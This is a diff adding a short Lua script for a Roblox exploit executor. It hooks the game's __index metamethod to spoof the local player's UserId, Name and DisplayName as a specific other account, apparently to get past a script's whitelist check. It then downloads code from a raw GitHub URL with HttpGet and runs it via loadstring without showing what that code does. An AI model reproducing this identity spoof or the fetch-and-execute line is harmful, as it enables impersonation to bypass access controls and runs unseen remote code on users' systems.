@@ -1,0 +1,20 @@
+local USER = 'byanXzy1'
+local DISP_NAME = 'Xzy'
+local USER_ID = 3711012346
+local PLAYER = game.Players.LocalPlayer
+
+local old_index
+old_index = hookmetamethod(game, '__index', function(obj, key)
+   if obj == PLAYER and checkcaller() then
+       if (key == 'UserId' or key == 'userId') then
+           return USER_ID
+       elseif key == 'Name' then
+           return USER
+       elseif key == 'DisplayName' then
+           return DISP_NAME
+       end
+   end
+   return old_index(obj, key)
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YuriumScriptAcc/IgSomethingLikeYurium/main/is-it-tho"))()
